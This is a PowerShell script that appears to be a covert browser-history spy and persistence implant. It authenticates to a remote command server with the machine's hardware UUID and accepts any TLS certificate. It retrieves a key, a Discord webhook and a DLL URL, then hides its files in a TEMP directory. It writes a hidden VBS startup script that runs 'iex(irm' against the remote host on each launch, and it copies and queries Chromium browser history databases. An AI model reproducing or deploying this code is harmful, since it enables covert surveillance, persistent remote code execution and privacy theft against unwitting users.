Set-StrictMode -Version Latest
Add-Type -AssemblyName System.Security

$Global:ProgressPreference = "SilentlyContinue"
$Global:ErrorActionPreference = "Stop"
$AppDir = "$($Env:TEMP)"
$AppGuid = "c13722d7-fdda-4487-be09-74449cd50fbb"
$SqliteDll = "System.Data.SQLite.dll"
$RemoteHost = "REMOTE_HOST"
$AgentPort = "AGENT_PORT"


if ($RemoteHost -eq "REMOTE_HOST") {
    $RemoteHost = "127.0.0.1"
    $AgentPort = 5555
}


function Main () {
    try {
        $logger = [Logger]::new("Function: $($MyInvocation.InvocationName)")

        $mutex = [System.Threading.Mutex]::new($false, $AppGuid)

        if (-not (Test-IsFirstInstance -Mutex $mutex)) {
            $logger.Warning("An another instance is already running.")
            return
        }

        try {
            while ($true) {
                $sleepSec = Get-RandomBetween -Min 30 -Max 240
                try {
                    $logger.info("Starting app..")
                    Runner
                }
                catch {
                    $logger.Error($_)
                    $logger.Info("Restarting app in $sleepSec seconds..")
                    Start-Sleep -Seconds $sleepSec
                    continue
                }
                break
            }
        }
        finally {
            $logger.Debug("Releasing mutex..")
            $mutex.ReleaseMutex()
        }
    }
    finally {
        $logger.info("Exiting app..")
    }
}

function Runner () {
    $logger = [Logger]::new("Function: $($MyInvocation.InvocationName)")

    # [Agent]
    $agent = setup_agent -RemoteHost $RemoteHost -AgentPort $AgentPort
    $responses = get_json_responses -Agent $agent
    $key = [System.Convert]::FromBase64String($responses["base64_key"])
    $discordWebhookUrl = $responses["discord_webhook_url"]
    $sqliteFileUrl = $responses["sqlite_file_url"]
    $logger.Info("Key (count): $($Key.Count), Discord webhook url: $discordWebhookUrl, Sqlite file url: $sqliteFileUrl")

    # [Basement]
    $basement = [Basement]::new($AppDir)

    # [Config], [ConfigManager]
    $configFilePath = Join-Path -Path $basement.Dir -ChildPath ([Basement]::GetName())
    $configManager = [ConfigManager]::new($configFilePath, $key)

    try {
        if (Test-Path -Path $basement.Dir) {
            $logger.Debug("Loading config file..")
            $config = $configManager.Load()

            # Resolve paths
            $sqlitePath = Join-Path -Path $config.SqliteDllsDir -ChildPath $SqliteDll
            $browserTrackerDir = $config.BrowserTrackerDir

            $logger.Debug("Sqlite path: $sqlitePath Browser tracker dir path: $browserTrackerDir")
        }
        else {
            $basement.CreateBasement()
            $sqliteDllsDir = $basement.CreateRoom()
            $browserTrackerDir = $basement.CreateRoom()

            $logger.Info("Downloading sqlite dlls..")
            $sqlitePath = Install-SqliteDlls -FileUrl $SqliteFileUrl -Directory $sqliteDllsDir

            $logger.Info("Creating vbs startup script..")
            $vbsFilePath = create_startup_script -Directory $basement.Dir -Name (Get-RandomChars -Length 3)
            $logger.Debug("VBS file: $vbsFilePath")

            $config = [Config]::new()
            $config.SqliteDllsDir = $sqliteDllsDir
            $config.BrowserTrackerDir = $browserTrackerDir
            $config.VbsFilePath = $vbsFilePath

            $logger.Info("Saving config..")
            $configManager.Save($config)

            $basement.HideAll()  # todo: Don't hide the VBS script file
        }
    }
    catch {
        $logger.Warning("Resetting basement directory..")
        Remove-Item -Path $basement.Dir -Recurse -Force
        throw $_
    }
    finally {
        $agent.Disconnect()
    }

    Add-Type -Path $sqlitePath
}

# **************************************************************
# *                                                            *
# *                         Scripts                            *
# *                                                            *
# **************************************************************
function setup_agent ([string] $RemoteHost, [int] $AgentPort, [bool] $IsSsl) {
    $agent = [Agent]::new($RemoteHost, $AgentPort, $IsSsl)
    $agent.Connect()
    [void] $agent.Authenticate((Get-SystemUuid))
    return $agent
}

function get_json_responses([Agent] $Agent) {
    $body = @{
        "requests" = @(
            "discord_webhook_url",
            "base64_key",
            "sqlite_file_url"
        )
    }

    $recvBody = $Agent.RequestJson($body)["responses"]
    return $recvBody
}

function create_startup_script([string] $Directory, [string] $Name) {
    $filePath = Join-Path -Path $Directory -ChildPath "$Name.vbs"
    $remoteFile = "main"

    $powershell = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    $cmd = "iex(irm $RemoteHost/$remoteFile)"
    $runPowershell = "`"$powershell`" -NoLogo -NoProfile -Command `"$cmd`"" -replace '"', '""'
    $vbsFile = "CreateObject(`"WScript.Shell`").Run `"$runPowershell`", 0, false "

    [void] (New-Item -Path $filePath -Value $vbsFile)
    return $filePath
}


# **************************************************************
# *                                                            *
# *                       Global Classes                       *
# *                                                            *
# **************************************************************
class Logger {
    [string] $LoggerName

    Logger () {
        $this.LoggerName = "UNNAMED"
    }

    Logger ([string] $Name) {
        $this.LoggerName = $Name
    }

    [void] Debug ([string] $Message) {
        $this.Write("DEBUG", $Message, "Gray")
    }

    [void] Info ([string] $Message) {
        $this.Write("INFO", $Message, "Green")
    }

    [void] Warning ([string] $Message) {
        $this.Write("WARNING", $Message, "Yellow")
    }

    [void] Error ([string] $Message) {
        $this.Write("ERROR", $Message, "Red")
    }

    hidden Write([string] $LevelName, [string] $Message, [string] $Color) {
        $timeStamp = Get-Date -Format "yyyy-MM-dd hh:mm:ss"
        Write-Host "$timeStamp - " -NoNewline; Write-Host "$LevelName" -NoNewline -ForegroundColor $Color; Write-Host " - <$($this.LoggerName)> - $Message"
    }
}

class Config {
    [string] $SqliteDllsDir
    [string] $BrowserTrackerDir
    [string] $VbsFilePath
}

class ConfigManager {
    hidden [string] $FilePath
    hidden [byte[]] $Key

    ConfigManager ([string] $FilePath, [byte[]] $Key) {
        $this.FilePath = $FilePath
        $this.Key = $Key
    }

    [void] Save ([Config] $Config) {
        $jsonStr = ConvertTo-Json -InputObject $Config
        $secureStrObj = ConvertTo-SecureString -String $jsonStr -AsPlainText -Force
        $encryptedStr = ConvertFrom-SecureString -SecureString $secureStrObj -Key $this.Key
        New-Item -Path $this.FilePath -ItemType File -Value $encryptedStr
    }

    [Config] Load () {
        $importSecureStringObj = Get-Content -Path $this.FilePath | ConvertTo-SecureString -Key $this.Key
        $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($importSecureStringObj)
        $jsonStr = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
        $config = [Config] (ConvertFrom-Json -InputObject $jsonStr)
        return $config
    }
}

class Basement : Logger {
    [string] $Dir
    [int] $RoomNameLength = 8

    Basement ([string] $Directory) {
        $this.LoggerName = "Class: Basement"

        if (-not (Test-Path -Path $Directory)) {
            throw "The directory to create basement does not exist."
        }

        $this.Dir = Join-Path -Path $Directory -ChildPath ([Basement]::GetName())
    }

    static [string] GetName () {
        $basementName = (Get-SystemUuid).Replace("-", "").ToLower()
        return $basementName
    }

    [void] CreateBasement() {
        if (Test-Path -Path $this.Dir) {
            throw "The basement directory already exist."
        }

        New-Item -Path $this.Dir -ItemType Directory
    }

    [string] CreateRoom () {
        $this.UpdateRoomNameLength()

        $roomDirPath = ""

        while ($true) {
            $roomDirPath = Join-Path -Path $this.Dir -ChildPath (Get-RandomChars -Length $this.RoomNameLength)
            $this.Debug("Validating a new room [$roomDirPath]")

            if (-not (Test-Path -Path $roomDirPath)) {
                break
            }
            Start-Sleep -Seconds 1
        }

        New-Item -Path $roomDirPath -ItemType Directory
        return $roomDirPath
    }

    [void] DeleteRoom ([string] $RoomPath) {
        $this.Info("Deleting the room [$RoomPath]")
        Remove-Item -Path $RoomPath -Recurse -Force
    }

    [void] HideAll () {
        Get-ChildItem -Path $this.Dir -Recurse -Force | ForEach-Object {
            $_.Attributes = $_.Attributes -bor "Hidden"
        }
    }

    [void] UpdateRoomNameLength () {
        $this.RoomNameLength = Get-RandomBetween -Min 7 -Max 24
    }
}

# **************************************************************
# *                                                            *
# *                       Browser Tracker                      *
# *                                                            *
# **************************************************************
class BrowserProfile {
    [string] $Name
    [string] $Path
    [long] $StartVisitTime = -1

    BrowserProfile (
        [string] $name,
        [string] $path
    ) {
        $this.Name = $name
        $this.Path = $path
    }
}

class Browser {
    [string] $Name
    [string] $FileName
    [string] $Group
    [string] $ProfilesPath
    [int] $ColorInt
    [BrowserProfile[]] $Profiles

    Browser (
        [string] $Name,
        [string] $FileName,
        [string] $Group,
        [string] $ProfilesPath,
        [int] $ColorInt
    ) {
        $this.Name = $Name
        $this.FileName = $FileName
        $this.Group = $Group
        $this.ProfilesPath = $ProfilesPath
        $this.ColorInt = $ColorInt
        $this.Profiles = [System.Collections.ArrayList]::new()
    }
}

$Global:Chromium = "chromium"
$Global:ChromiumHistoryFile = "History"
$Global:Firefox = "firefox"
$Global:FirefoxHistoryFile = "places.sqlite"
$Global:UnixTime1601to1970 = 11644473600
$Global:Microsecond = 1000000

# This class needs Sqlite dll
class BrowserTracker : Logger {
    [string] $WorkDir
    hidden [hashtable] $Browsers = @{
        "chrome"   = [Browser]::new("Google Chrome", "chrome", $Global:Chromium, "${Env:LOCALAPPDATA}\Google\Chrome\User Data", 16007990)
        "msedge"   = [Browser]::new("Microsoft Edge", "msedge", $Global:Chromium, "${Env:LOCALAPPDATA}\Microsoft\Edge\User Data", 2001125)
        "brave"    = [Browser]::new("Brave", "brave", $Global:Chromium, "${Env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data", 14828072)
        "firefox"  = [Browser]::new("Firefox", "firefox", $Global:Firefox, "${Env:APPDATA}\Mozilla\Firefox\Profiles", 15097856)
        "waterfox" = [Browser]::new("WaterFox", "waterfox", $Global:Firefox, "${Env:APPDATA}\Waterfox\Profiles", 13107198)
    }

    BrowserTracker ([string] $workDir) {
        $this.LoggerName = "Class: BrowserTracker"
        $this.WorkDir = $workDir
    }

    [Browser[]] GetBrowsers () {
        $foundBrowsers = [System.Collections.ArrayList]::new()

        foreach ($browser in $this.Browsers.Values) {
            if (Test-Path -Path $browser.ProfilesPath) {
                $this.Info("Browser found: $($Browser.Name)")
                $foundProfiles = $this.GetProfiles($browser)
                $browser.Profiles = $foundProfiles

                $foundBrowsers.Add($browser)
            }
        }

        return $foundBrowsers
    }

    [BrowserProfile[]] GetProfiles ([Browser] $Browser) {
        $foundProfiles = [System.Collections.ArrayList]::new()

        Get-ChildItem -Path $Browser.ProfilesPath -Directory | ForEach-Object {
            if ($Browser.Group -eq $Global:Chromium) {
                if (($_.BaseName -eq "Default") -or ($_.BaseName -match "Profile [0-9]")) {
                    if (Test-Path -Path (Join-Path -Path $_.FullName -ChildPath $Global:ChromiumHistoryFile)) {
                        $foundProfiles.Add([BrowserProfile]::new($_.BaseName, $_.FullName))
                    }
                }
            }
            elseif ($Browser.Group -eq $Global:Firefox) {
                if ($_.BaseName -match ".default-release") {
                    if (Test-Path -Path (Join-Path -Path $_.FullName -ChildPath $Global:FirefoxHistoryFile)) {
                        $foundProfiles.Add([BrowserProfile]::new($_.BaseName, $_.FullName))
                    }
                }
            }
        }

        $this.Info("$foundProfiles")
        return $foundProfiles
    }

    [hashtable[]] GetProfileHistories (
        [BrowserProfile] $BrowserProfile,
        [string] $BrowserGroup,
        [bool] $FromStartOfTheDay
    ) {
        $histories = [System.Collections.ArrayList]::new()
        if ($BrowserGroup -eq $Global:firefox) {
            return $histories  # todo: firefox
        }

        $browserHistoryFileName = Get-Variable -Name "$($BrowserGroup)HistoryFile" -ValueOnly
        $originalHistoryFilePath = Join-Path -Path $BrowserProfile.Path -ChildPath $browserHistoryFileName
        $copiedHistoryFilePath = Join-Path -Path $this.WorkDir -ChildPath (Get-RandomChars)
        Copy-Item -Path $originalHistoryFilePath -Destination $copiedHistoryFilePath

        if ($FromStartOfTheDay) {
            $startVisitTime = $this.ConvertToLastVisitTimeFmt($this.GetStartOfTheDayTimeInUnix())
        }
        else {
            $startVisitTime = $BrowserProfile.StartVisitTime
        }
        $endVisitTime = $this.ConvertToLastVisitTimeFmt($this.GetCurrentTimeInUnix())

        $sqliteSelectData = @("id", "last_visit_time", "title", "url")
        $sqliteCmd = "" `
            + "SELECT $($sqliteSelectData -Join ",") FROM urls " `
            + "WHERE last_visit_time BETWEEN $startVisitTime AND $endVisitTIme " `
            + "ORDER BY last_visit_time ASC"

        $connection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$copiedHistoryFilePath")
        $connection.Open()
        $command = $connection.CreateCommand()
        $command.CommandText = $sqliteCmd
        $reader = $command.ExecuteReader()

        while ($reader.Read()) {
            $historyHashtable = @{}
            foreach ($dataName in $sqliteSelectData) {
                $historyHashtable[$dataName] = $reader[$dataName]
            }
            $histories.Add($historyHashtable)
        }

        if ($histories) {
            $BrowserProfile.StartVisitTime = $endVisitTime
        }

        $reader.Close()
        $command.Close()
        $connection.Close()

        Remove-Item -Path $copiedHistoryFilePath -Force
        return $histories
    }

    [void] ClearWorkDir () {
        $fileCount = (Get-ChildItem -Path $this.WorkDir).Length
        Remove-Item -Path (Join-Path -Path $this.WorkDir -ChildPath *)
        $this.Debug("Remove $fileCount file(s)")
    }

    [long] ConvertToUnixTime ([long] $lastVisitTimeFmt) {
        return $lastVisitTimeFmt / $Global:Microsecond - $Global:UnixTime1601to1970
    }

    [long] ConvertToLastVisitTimeFmt ([long] $unixTime) {
        return ($unixTime + $Global:UnixTime1601to1970) * $Global:Microsecond
    }

    [long] GetCurrentTimeInUnix () {
        $currentUnixTime = Get-Date -UFormat %s
        return $this.FixPwsh5UnixTime($currentUnixTime)
    }

    [long] GetStartOfTheDayTimeInUnix () {
        $startOfTheDayUnixTime = Get-Date -Date (Get-Date -Format d) -UFormat %s
        return $this.FixPwsh5UnixTime($startOfTheDayUnixTime)
    }

    [long] FixPwsh5UnixTime ([long] $unixTime) {
        if ($Global:PSVersionTable.PSVersion.Major -eq 5) {
            $unixTime -= (Get-TimeZone).BaseUtcOffset.TotalSeconds
        }
        return $unixTime
    }
}

# **************************************************************
# *                                                            *
# *                          Agent                             *
# *                                                            *
# **************************************************************
enum Operation {
    PING = 10
    DISCONNECT = 11
    AUTHENTICATE = 12
    JSON_REQUEST = 20
}

enum Status {
    OK = 10
    BAD = 11
    # Exceptions
    UNAUTHORIZED_ERROR = 20
    INVALID_OPERATION_ERROR = 21
    INVALID_PAYLOAD_ERROR = 22
}

class Length {
    static [int] $Status = 2
    static [int] $Operation = 2
    static [int] $PayloadSize = 4
}

class Response {
    [Status] $Status
    [System.Object] $Data

    Response ([Status] $Status, [System.Object] $Data) {
        $this.Status = $Status
        $this.Data = $Data
    }
}

class Agent : Logger {
    [string] $RemoteHost
    [int] $Port
    [bool] $IsSsl
    [System.Net.Sockets.TcpClient] $TcpClient
    [System.Object] $Stream  # [System.Net.Sockets.NetworkStream] or [System.Net.Security.SslStream]

    Agent ([string] $RemoteHost, [int] $Port, [bool] $IsSsl) {
        $this.LoggerName = "Class: Agent"
        $this.RemoteHost = $RemoteHost
        $this.Port = $Port
        $this.IsSsl = $IsSsl
        $this.TcpClient = [System.Net.Sockets.TcpClient]::new()
        $this.TcpClient.SendTimeout = 60000
        $this.TcpClient.ReceiveTimeout = 60000
    }

    ############################# APIs #############################
    [void] Connect () {
        $this.Debug("Connecting to the agent server.. (Host: $($this.RemoteHost), Port: $($this.Port))")

        if ($this.TcpClient.Client.Connected) {
            throw "The TCP client is already established with the agent server."
        }

        $this.TcpClient.Connect($this.RemoteHost, $this.Port)
        $unsecureStream = $this.TcpClient.GetStream()

        if ($this.IsSsl) {
            $this.Stream = $this.GetSslStream($unsecureStream)
            $this.AuthenticateAsClient($this.Stream)
        }
        else {
            $this.Stream = $unsecureStream
        }

        $this.Info("Connected")
    }

    [void] Ping () {
        $this.Get([Operation]::PING)
    }

    [bool] Authenticate ([object] $Key) {
        if ( $Key.GetType() -notin @([string], [byte[]]) ) {
            throw "An authenticate key should be `"string`" or `"byte array`" type."
        }

        if ($Key -is [string]) {
            $Key = [System.Text.Encoding]::UTF8.GetBytes($Key)
        }

        $response = $this.Get([Operation]::AUTHENTICATE, $Key)

        if ($response.Status -eq [Status]::OK) {
            return $true
        }
        return $false
    }

    [hashtable] RequestJson([hashtable] $Hashtable) {
        $jsonStr = ConvertTo-Json -InputObject $Hashtable
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonStr)

        $response = $this.Get([Operation]::JSON_REQUEST, $bytes)
        $jsonStr = [System.Text.Encoding]::UTF8.GetString($response.Data)

        if ($Global:PSVersionTable.PSVersion.Major -gt 5) {
            $hashtable = ConvertFrom-Json -InputObject $jsonStr -AsHashtable
        }
        else {
            $psCustomObj = ConvertFrom-Json -InputObject $jsonStr
            $hashtable = ConvertTo-Hashtable -InputObject $psCustomObj
        }
        return $hashtable
    }
    
    [void] Disconnect () {
        if (($null -eq $this.TcpClient.Client) -or (-not ($this.TcpClient.Client.Connected))) {
            throw "Disconnect() method cannot be called when there is no connection to the server or when the connection is closed."
        }

        $this.Info("Disconnecting..")
        $this.Request([Operation]::DISCONNECT)
        $this.Stream.Close()
        $this.TcpClient.Close()

        # Refresh "TcpClient" object
        $this.TcpClient = [System.Net.Sockets.TcpClient]::new()
    }

    ############################# Commands #############################
    [Response] Get([Operation] $Operation) {
        return $this.Get($Operation, $this.GetEmptyByte())
    }

    [Response] Get([Operation] $Operation, [byte[]] $Payload) {
        $this.Request($Operation, $Payload)
        $response = $this.Receive()
        $this.Info("Request: `"$operation`" [$([int] $operation)] -> Response: `"$($response.Status)`" [$([int] $response.Status)]")
        return $response
    }

    [void] Request ([Operation] $Operation) {
        $this.Request($Operation, $this.GetEmptyByte())
    }

    [void] Request ([Operation] $Operation, [byte[]] $Payload) {
        $requestBytes = $this.CreateRequestBytes($Operation, $Payload)
        $this.Send($requestBytes)
    }

    [Response] Receive() {
        $statusBytes = $this.Read([Length]::Status)
        $statusInt = ConvertTo-Int -ByteArray $statusBytes
        $status = [Status].GetEnumName($statusInt)

        $payloadSizeBytes = $this.Read([Length]::PayloadSize)
        $payloadSize = ConvertTo-Int -ByteArray $payloadSizeBytes

        if ($payloadSize -gt 0) {
            $payload = $this.Read($payloadSize)
        }
        else {
            $payload = $this.GetEmptyByte()
        }

        $this.Debug("Receive <- Status: `"$statusBytes`" Payload size: `"$payloadSizeBytes`" Payload count: <$($Payload.Count)>")

        if ($status -notin @([Status]::OK, [Status]::BAD)) {
            throw "Agent received an exception status: `"$status`" [$statusInt]"
        }

        return [Response]::new($status, $payload)
    }

    hidden [byte[]] CreateRequestBytes([Operation] $Operation, [byte[]] $Payload) {
        $operationBytes = ConvertTo-Bytes -Integer ([int] $Operation) -Length ([Length]::Operation)
        $payloadSizeBytes = ConvertTo-Bytes -Integer $Payload.Length -Length ([Length]::PayloadSize)

        $requestBytes = $operationBytes + $payloadSizeBytes + $Payload
        $this.Debug("Send -> Operation: `"$operationBytes`" Payload size: `"$payloadSizeBytes`" Payload: <$($Payload.Count)>")

        return $requestBytes
    }

    ############################# Low level Apis #############################

    hidden [void] Send ([byte[]] $Data) {
        $this.Stream.Write($Data, 0, $Data.Length)
        $this.Stream.Flush()
    }

    hidden [byte[]] Read([int] $Size) {
        $this.Debug("Reading buffer.. ($Size)")
        $buffer = New-Object byte[] $Size
        $this.Stream.Read($buffer, 0, $Size)
        return $buffer
    }

    hidden [byte[]] GetEmptyByte() {
        return ([byte[]] @())
    }

    hidden [System.Net.Security.SslStream] GetSslStream([System.Net.Sockets.NetworkStream] $Stream) {
        return [System.Net.Security.SslStream]::new(
            $Stream,
            $false,
            { param ($Transfer, $Cert, $Chain, $Policy) $true }, # Always return "true"
            $null
        )
    }

    hidden [void] AuthenticateAsClient ([System.Net.Security.SslStream] $Stream) {
        $Stream.AuthenticateAsClient(
            $null,
            $null,
            [System.Security.Authentication.SslProtocols]::Tls13,
            $null
        )
    }
}

# **************************************************************
# *                                                            *
# *                         Utilities                          *
# *                                                            *
# **************************************************************
function Test-IsFirstInstance ([System.Threading.Mutex] $Mutex) {
    if (-not $Mutex.WaitOne(0, $false)) {
        return $false
    }
    return $true
}

function Get-RandomBetween ([int] $Min, [int] $Max) {
    $randInt = Get-Random -Minimum $Min -Maximum ($Max + 1)
    return $randInt
}

function Get-RandomChars([int] $Length = 8) {
    $chars = ("0123456789" + "abcdefghijklmnopqrstuvwxyz").ToCharArray()

    $randomChars = ""
    for ($i = 0; $i -lt $Length; $i++) {
        $randomChars += Get-Random -InputObject $chars
    }

    return $randomChars
}

function Get-SystemUuid {
    $systemUuid = Get-WmiObject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    return $systemUuid
}

function ConvertTo-Bytes([int] $Integer, [int] $Length) {
    $intBytes = [System.BitConverter]::GetBytes($Integer)  # 4 bytes (little endian)
    if ($Length -eq 4) {
        return $intBytes
    }

    $byteArray = New-Object System.Byte[] $Length
    for ($i = 0; $i -lt $Length; $i++) {
        $byteArray[$i] = $intBytes[$i]
    }

    return $byteArray
}

function ConvertTo-Int([byte[]] $ByteArray) {
    if ($ByteArray.Count -eq 2) {
        $ByteArray = $ByteArray + @(0x00, 0x00)  # Convert to 4 bytes
    }
    $int = [System.BitConverter]::ToInt32($ByteArray, 0)

    return $int
}

function Install-SqliteDlls ([string] $FileUrl, [string] $Directory) {
    $zipFilePath = Join-Path -Path $Directory -ChildPath "file.zip"
    Invoke-WebRequest -Uri $FileUrl -OutFile $zipFilePath
    Expand-Archive -Path $zipFilePath -DestinationPath $Directory
    Remove-Item -Path $zipFilePath -Force
    $dllPath = Join-Path -Path $Directory -ChildPath $SqliteDll
    return $dllPath
}

# Written by ChatGPT
function ConvertTo-Hashtable ([System.Object] $InputObject) {
    $hashTable = @{}

    foreach ($property in $InputObject.PSObject.Properties) {
        if ($property.Value -is [System.Management.Automation.PSCustomObject]) {
            $hashTable[$property.Name] = ConvertTo-Hashtable -InputObject $property.Value
        }
        elseif ($property.Value -is [System.Collections.IList]) {
            $hashTable[$property.Name] = @()

            foreach ($item in $property.Value) {
                if ($item -is [System.Management.Automation.PSCustomObject]) {
                    $hashTable[$property.Name] += ConvertTo-Hashtable -InputObject $item
                }
                else {
                    $hashTable[$property.Name] += $item
                }
            }
        }
        else {
            $hashTable[$property.Name] = $property.Value
        }
    }

    return $hashTable
}

# **************************************************************
# *                                                            *
# *                        Entry Point                         *
# *                                                            *
# **************************************************************
if ($MyInvocation.InvocationName -ne ".") {
    Main
}
